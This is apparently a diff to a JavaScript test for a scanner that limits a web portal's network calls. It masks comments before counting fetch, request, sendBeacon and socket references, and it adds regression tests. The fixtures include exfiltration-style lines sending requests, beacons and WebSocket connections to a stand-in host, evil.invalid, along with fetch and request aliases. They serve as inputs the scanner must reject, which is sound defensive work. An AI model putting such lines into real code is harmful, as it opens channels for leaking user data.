@@ -48,10 +48,61 @@ for (const pathLiteral of [
   assert.equal(isCanonicalApiLiteral(pathLiteral), false, `${pathLiteral}: unsafe API literal`);
 }
 
+// Preserve every executable source token, including string literals and
+// template expressions, but mask source comments before counting network
+// references. Counting words in comments made safe portal documentation fail
+// the CI boundary without corresponding executed JS. Keep mask lengths and
+// line breaks so the existing literal /api route checks see unchanged code.
+function withoutJavascriptComments(source) {
+  let out = "";
+  let mode = "code";
+  let escaped = false;
+  for (let i = 0; i < source.length; i++) {
+    const c = source[i];
+    const next = source[i + 1];
+    if (mode === "line") {
+      if (c === "\n" || c === "\r") {
+        out += c;
+        mode = "code";
+      } else out += " ";
+      continue;
+    }
+    if (mode === "block") {
+      if (c === "*" && next === "/") {
+        out += "  ";
+        i++;
+        mode = "code";
+      } else out += c === "\n" || c === "\r" ? c : " ";
+      continue;
+    }
+    if (mode !== "code") {
+      out += c;
+      if (escaped) escaped = false;
+      else if (c === "\\") escaped = true;
+      else if (c === mode) mode = "code";
+      continue;
+    }
+    if (c === "/" && next === "/") {
+      out += "  ";
+      i++;
+      mode = "line";
+    } else if (c === "/" && next === "*") {
+      out += "  ";
+      i++;
+      mode = "block";
+    } else {
+      out += c;
+      if (c === "'" || c === '"' || c === "`") mode = c;
+    }
+  }
+  return out;
+}
+
 function validatePortalNetworkBoundary(source, label) {
   const findings = [];
+  const checkedSource = withoutJavascriptComments(source);
 
-  const fetchCalls = [...source.matchAll(/\bfetch\s*\(/g)];
+  const fetchCalls = [...checkedSource.matchAll(/\bfetch\s*\(/g)];
   if (fetchCalls.length !== 1) {
     findings.push(
       `${label}: must contain exactly one fetch() call inside the reviewed request() helper; found ${fetchCalls.length}`
@@ -60,14 +111,14 @@ function validatePortalNetworkBoundary(source, label) {
 
   // A direct-call count alone misses aliases like const leak = window.fetch.
   // Permit only the single token of the reviewed wrapper's fetch() call.
-  const fetchReferences = [...source.matchAll(/\bfetch\b/g)];
+  const fetchReferences = [...checkedSource.matchAll(/\bfetch\b/g)];
   if (fetchReferences.length !== fetchCalls.length) {
     findings.push(
       `${label}: indirect fetch references and aliases are forbidden; found ${fetchReferences.length} references for ${fetchCalls.length} direct calls`
     );
   }
 
-  const helper = source.match(
+  const helper = checkedSource.match(
     /async function request\(url, options = \{\}\) \{([\s\S]*?)\n\}/
   );
   if (!helper || !/\bfetch\s*\(\s*url\s*,/.test(helper[1])) {
@@ -77,17 +128,17 @@ function validatePortalNetworkBoundary(source, label) {
   }
 
   for (const primitive of ["XMLHttpRequest", "WebSocket", "EventSource"]) {
-    if (new RegExp(`\\b${primitive}\\b`).test(source)) {
+    if (new RegExp(`\\b${primitive}\\b`).test(checkedSource)) {
       findings.push(`${label}: unreviewed network primitive ${primitive} is forbidden even through aliases`);
     }
   }
 
   const requestInvocationCount =
-    [...source.matchAll(/\brequest\s*\(/g)].length -
-    [...source.matchAll(/\bfunction\s+request\s*\(/g)].length;
-  const requestCalls = quotedLeadingArgumentCalls(source, "request");
-  const requestDefinitionCount = [...source.matchAll(/\bfunction\s+request\s*\(/g)].length;
-  const requestReferences = [...source.matchAll(/\brequest\b/g)].length;
+    [...checkedSource.matchAll(/\brequest\s*\(/g)].length -
+    [...checkedSource.matchAll(/\bfunction\s+request\s*\(/g)].length;
+  const requestCalls = quotedLeadingArgumentCalls(checkedSource, "request");
+  const requestDefinitionCount = [...checkedSource.matchAll(/\bfunction\s+request\s*\(/g)].length;
+  const requestReferences = [...checkedSource.matchAll(/\brequest\b/g)].length;
   if (requestReferences !== requestInvocationCount + requestDefinitionCount) {
     findings.push(
       `${label}: indirect request() references, aliases and computed calls are forbidden`
@@ -108,9 +159,9 @@ function validatePortalNetworkBoundary(source, label) {
     }
   }
 
-  const beaconInvocationCount = [...source.matchAll(/\bnavigator\.sendBeacon\s*\(/g)].length;
-  const beaconCalls = quotedLeadingArgumentCalls(source, "navigator\\.sendBeacon");
-  const beaconReferences = [...source.matchAll(/\bsendBeacon\b/g)].length;
+  const beaconInvocationCount = [...checkedSource.matchAll(/\bnavigator\.sendBeacon\s*\(/g)].length;
+  const beaconCalls = quotedLeadingArgumentCalls(checkedSource, "navigator\\.sendBeacon");
+  const beaconReferences = [...checkedSource.matchAll(/\bsendBeacon\b/g)].length;
   if (beaconReferences !== beaconInvocationCount) {
     findings.push(
       `${label}: indirect sendBeacon access or alias is forbidden`
@@ -149,6 +200,30 @@ assert.deepEqual(
   [],
   "safe same-origin API calls must remain allowed"
 );
+
+// Comments are not executable network accesses. The scanner must handle
+// inline/block documentation while retaining all dangerous tokens in actual
+// code, strings and computed network primitive aliases.
+const safeWithComments = safeFixture +
+  '\n// window.fetch and request(\"https://evil.invalid/\") are examples only\n' +
+  '/* const leak = request; navigator.sendBeacon(\"//evil.invalid\"); */\n' +
+  'request(\"/api/health\"); // request is documented, not aliased\n';
+assert.deepEqual(validatePortalNetworkBoundary(safeWithComments, "comment fixture"), [],
+  "comments must not cause false positives in a locked-down portal");
+assert.equal(withoutJavascriptComments('const url = \"https://example.invalid/path\";')
+  .includes('https://example.invalid/path'), true,
+  "HTTPS URL strings must not be mistaken for source line comments");
+for (const [description, appended] of [
+  ['fetch alias after comments', 'const bypass = window.fetch;'],
+  ['computed fetch alias after comments', 'window[\"fetch\"](\"https://evil.invalid/\");'],
+  ['request alias after comments', 'const leak = request;'],
+  ['new cross-origin direct request', 'request(\"https://evil.invalid/\");'],
+  ['socket after comments', 'new WebSocket(\"wss://evil.invalid\");']
+]) {
+  const findings = validatePortalNetworkBoundary(safeWithComments + appended,
+    description);
+  assert.ok(findings.length > 0, description + ": executable bypass must remain denied");
+}
 
 for (const [name, source, expected] of [
   [
